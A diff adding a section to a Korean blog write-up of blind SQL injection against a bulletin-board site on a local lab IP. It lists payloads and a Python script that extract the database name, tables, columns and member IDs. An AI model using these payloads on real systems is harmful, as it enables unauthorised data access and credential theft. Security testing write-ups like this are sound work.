@@ -131,6 +131,115 @@ _________________________________________________
 <figcaption>Fig 6. 게시판 -공격 확인 (3/3)</figcaption>
 </figure>
 
+쿼리 공격구문이 성공하여 `항상 참`이 되는 `결과값`을 볼 수 있었습니다
+그래서 저는 아래 방식으로 `데이터베이스 이름`, `테이블 이름`, `테이블의 컬럼` 등등를 가져왔습니다.
+<br>
+<figure>
+<div class="overflow-table" markdown="block">
+
+|      종류                | 공격 구문                               |
+| :---------------------- | :--------------------------------- |
+| `데이터베이스 길이` | `1' and length(database()) > 2#` |
+| `데이터베이스 이름`           | `1' and substring(database(),1,1)='c'#, 1' and substring(database(),2,1)='i'#`               |
+| `CIA 데이터베이스 테이블 길이`           | `1' and length((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1))=5#, 1' and length((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 1,1))=10#`       |
+| `CIA 데이터베이스 테이블 이름`           | `1' and (select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0, 1) = 'board'#,1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),1,1) = 'b'#, 1' and (select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 2, 1) = 'member'#`
+| `CIA 데이터베이스 테이블 컬럼 길이`           | `1' and length((select column_name from information_schema.columns where table_name='member' limit 0,1))=3#, 1' and length((select column_name from information_schema.columns where table_name='member' limit 1,1))=2#`
+| `CIA 데이터베이스 테이블 컬럼 이름`           | `1' and substring((select column_name from information_schema.columns where table_name='member' limit 0,1),1,1) = 'i'#, 1' and substring((select column_name from information_schema.columns where table_name='member' limit 0,1),2,1) = 'd'#`
+| `아이디 가져오기`           | `1' and (select idx from member where id='veloideu')#, 1' and (select id from member limit 6,1)='qwe'#`
+| `패스워드 길이 가져오기`           | `1' and length((select pw from member where id='veloideu'))=60#`
+| `패스워드 암호화 방식 확인`           | `1' and sha1("123")=(select pw from member where id='veloideu')#`
+
+</div>
+<figcaption>쿼리 공격을 위한 공격 구문 테이블</figcaption>
+</figure>
+
+```python
+import requests
+from bs4 import BeautifulSoup
+import string
+
+comparison = string.ascii_lowercase
+
+db_name ="    DB 이름 : "
+table_name =" Table 이름 : "
+Column_name ="Column 이름 : "
+Member_name ="Member 이름 : "
+
+for b in range(1, 4):
+    for i in comparison:
+        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring(database(),{b},1)='{i}'%23"
+        response = requests.get(url)
+        response_text = response.text
+        soup = BeautifulSoup(response_text, 'html.parser')
+        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')
+
+        if title != None:
+            db_name += i
+        else :
+            pass
+
+for a in range(1, 6):
+    for b in comparison:
+
+        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='CIA' limit 0,1),{a},1) = '{b}'%23"
+        response = requests.get(url)
+        response_text = response.text
+        soup = BeautifulSoup(response_text, 'html.parser')
+        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')
+
+        if title != None:
+            table_name += b
+        else :
+            pass
+
+for a in range(1, 3):
+    for b in comparison:
+
+        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select column_name from information_schema.columns where table_name='member' limit 1,1),{a},1) = '{b}'%23"
+        response = requests.get(url)
+        response_text = response.text
+        soup = BeautifulSoup(response_text, 'html.parser')
+        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')
+
+        if title != None:
+            Column_name += b
+        else :
+            pass
+
+for a in range(1, 6):
+    for b in comparison:
+
+        url = f"http://192.168.35.237/page/board/search_result.php?catgo=title&search=1' and substring((select id from member limit 1,1),{a},1)='{b}'%23"
+        response = requests.get(url)
+        response_text = response.text
+        soup = BeautifulSoup(response_text, 'html.parser')
+        title = soup.select_one('#board_area > table > tbody > tr > td:nth-child(2) > a > span:nth-child(1)')
+
+        if title != None:
+            Member_name += b
+        else :
+            pass
+
+
+print(db_name)
+print(table_name)
+print(Column_name)
+print(Member_name)
+```
+<figcaption>Fig 7. 쿼리 공격 스크립트 (1/3)</figcaption>
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbybK40%2FbtrdPJTgRVU%2Fs9GCSyvkkn8qAjhOVye32K%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 8. 쿼리 공격 스크립트 (2/3)</figcaption>
+</figure>
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbXLWXs%2FbtrdPItm9Cx%2FMikd0xUGgLSJYMKa82b8ik%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 9. 쿼리 공격 스크립트 (3/3)</figcaption>
+</figure>
+
+저는 시간을 단축하기 위해 위의 7~9번 사진처럼 공격 스크립트 `파이썬`을 이용하여 작성 후 공격하여 `원하는 결과값`을 얻을 수 있엇습니다.
+
 
 
 
